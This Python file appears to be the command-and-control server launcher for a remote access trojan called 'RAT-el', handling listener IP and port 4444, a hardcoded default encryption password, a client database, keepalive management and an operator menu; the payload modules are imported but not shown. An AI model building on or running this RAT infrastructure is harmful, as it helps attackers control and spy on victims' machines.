import sys
import argparse
import time
import os

from scripts.handler import Handler
from scripts.menu import Menu
from scripts.management import Management
from scripts.other import printColor
from scripts.other import myBanner

from scripts.other import exec
from scripts.sql import Sql

from colorama import Fore,Style,init
import platform

if(platform.system() == "Linux"):
    exec("clear")
else: #if windows
    exec("cls")

init()

printColor("successfully",myBanner())

parser = argparse.ArgumentParser()
parser.add_argument("-i","--ip", dest="IP", default="", help="the ip address of the server.")
parser.add_argument("-p","--port", dest="PORT",default=4444, help="the port number of the server.")
parser.add_argument("-t","--time", dest="TIME", default=60, help="the number of seconds of automatic message sending to check if the connection is alive or dead.")
parser.add_argument("-pa", "--password", dest="PASSWORD", default="CISCOTHEBOSS", help="The password to generate the key to encrypt and decrypt the data. The default password is 'CISCOTHEBOSS'.")
parser.add_argument("-c","--clean", dest="CLEAN", action="store_true", default=False, help="cleans all the data in the database.")
parser.add_argument("-d","--display", action="store_false", default=True, help="disables the display of client information (Logoff and incoming connection).")


try:
    argv = vars(parser.parse_args())

    HOST = str(argv["IP"])
    PORT = int(argv["PORT"])
    DISPLAY = bool(argv["display"])
    TIME = int(argv["TIME"])
    CLEAN = float(argv["CLEAN"])
    PASSWORD = str(argv["PASSWORD"])

except SystemExit:
    print("Basic example: /usr/bin/python3 server.py -p 4444" )
    exit(0)
else:  
    #print("[+] Server started.\n")
    if(CLEAN):
        try:
            os.remove("sql/RAT-el.sqlite3")
        except Exception as e:
            print(e)
            
    SqlObj = Sql("sql/RAT-el.sqlite3", "sql/table_ratel.sql", "table_ratel")

    handler= Handler(HOST,PORT,DISPLAY,SqlObj,PASSWORD) 
    handler.initialization()
    
    management = Management(TIME,SqlObj) #2 seconds.

    menu = Menu()

    handler.daemon=True
    management.daemon=True
   
    handler.start()
    
    while True:
        time.sleep(1)
        if(handler.start_handler):
            break

    management.start()

    try:
        menu.main()
    
    except KeyboardInterrupt:
        pass

    finally: 
        handler.SuccessfullyQuit() 
        SqlObj.closeConn()
        
        printColor("successfully","\n\nVersion: Beta-v0")
        printColor("successfully","By @cisco")
        print(Style.RESET_ALL) #Restore color terminal
        sys.exit(0)
